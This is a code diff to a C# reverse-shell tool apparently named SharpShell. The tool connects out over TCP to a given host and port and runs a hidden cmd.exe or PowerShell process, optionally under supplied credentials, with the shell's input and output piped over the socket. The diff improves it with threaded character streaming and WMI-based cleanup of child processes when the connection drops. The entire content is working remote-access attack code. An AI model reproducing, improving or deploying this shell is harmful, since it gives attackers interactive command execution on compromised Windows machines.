@@ -4,6 +4,9 @@ using System.IO;
 using System.Diagnostics;
 using System.Net.Sockets;
 using System.Linq;
+using System.Threading.Tasks;
+using System.Collections.Generic;
+using System.Management;
 
 namespace SharpShell
 {
@@ -22,33 +25,19 @@ namespace SharpShell
             using (var client = new TcpClient(host, port))
             {
                 using (var stream = client.GetStream())
-                using (var rdr = new StreamReader(stream))
                 {
-
-                    var streamWriter = new StreamWriter(stream);
-                    var strInput = new StringBuilder();
-
                     using (var p = new Process())
                     {
+                        var run = true;
                         p.StartInfo.FileName = isPS ? "powershell.exe" : "cmd.exe";
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
                         p.StartInfo.RedirectStandardOutput = true;
                         p.StartInfo.RedirectStandardInput = true;
                         p.StartInfo.RedirectStandardError = true;
-                        p.OutputDataReceived += new DataReceivedEventHandler((x, outLine) =>
+                        p.Exited += new EventHandler((x, y) =>
                         {
-                            var strOutput = new StringBuilder();
-                            if (!String.IsNullOrEmpty(outLine.Data))
-                            {
-                                try
-                                {
-                                    strOutput.Append(outLine.Data);
-                                    streamWriter.WriteLine(strOutput);
-                                    streamWriter.Flush();
-                                }
-                                catch { }
-                            }
+                            run = false;
                         });
                         if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(user))
                         {
@@ -59,18 +48,86 @@ namespace SharpShell
                             pass = null; ;
                             p.StartInfo.Password = ssPwd;
                         }
-                        p.Start();
-                        p.BeginOutputReadLine();
 
-                        while (true)
+                        p.Start();
+
+                        var outTask = Task.Factory.StartNew(new Action(() =>
                         {
-                            strInput.Append(rdr.ReadLine());
-                            p.StandardInput.WriteLine(strInput);
-                            strInput.Remove(0, strInput.Length);
-                        }
+                            using (var streamWriter = new StreamWriter(stream))
+                            {
+                                streamWriter.AutoFlush = true;
+                                while (run)
+                                {
+                                    try
+                                    {
+                                        var c = char.ConvertFromUtf32(p.StandardOutput.Read());
+                                        streamWriter.Write(c);
+                                    }
+                                    catch { run = client.Connected; }
+                                }
+                            }
+                        }), TaskCreationOptions.LongRunning);
+                        var inTask = Task.Factory.StartNew(new Action(() =>
+                        {
+                            using (var rdr = new StreamReader(stream))
+                            {
+                                rdr.BaseStream.ReadTimeout = 1000;
+                                while (run)
+                                {
+                                    try
+                                    {
+                                        var line = rdr.ReadLine();
+                                        p.StandardInput.WriteLine(line);
+                                        p.StandardInput.Flush();
+                                    }
+                                    catch {
+                                        run = client.Connected;
+                                        if (!run)
+                                        {
+                                            GetChildProcesses(p).ToList().ForEach(c=> { c.Kill(); });
+                                            p.Kill();
+                                            return;
+                                        }
+                                    }
+                                }
+                            }
+                        }), TaskCreationOptions.LongRunning);
+                        var errTask = Task.Factory.StartNew(new Action(() =>
+                        {
+                            using (var streamWriter = new StreamWriter(stream))
+                            {
+                                streamWriter.AutoFlush = true;
+                                while (run)
+                                {
+                                    try
+                                    {
+                                        var c = char.ConvertFromUtf32(p.StandardError.Read());
+                                        streamWriter.Write(c);
+                                    }
+                                    catch { run = client.Connected; }
+                                }
+                            }
+                        }), TaskCreationOptions.LongRunning);
+
+                        Task.WaitAll(outTask, inTask, errTask);
                     }
                 }
             }
+        }
+
+        private static IEnumerable<Process> GetChildProcesses(Process process)
+        {
+            var children = new List<Process>();
+            using (var mos = new ManagementObjectSearcher(String.Format("Select * From Win32_Process Where ParentProcessID={0}", process.Id)))
+            {
+                foreach (var mo in mos.Get())
+                {
+                    var p = Process.GetProcessById(Convert.ToInt32(mo["ProcessID"]));
+                    children.Add(p);
+                    children.AddRange(GetChildProcesses(p));
+                }
+            }
+            return children;
         }
 
         private static void ShowHelp()
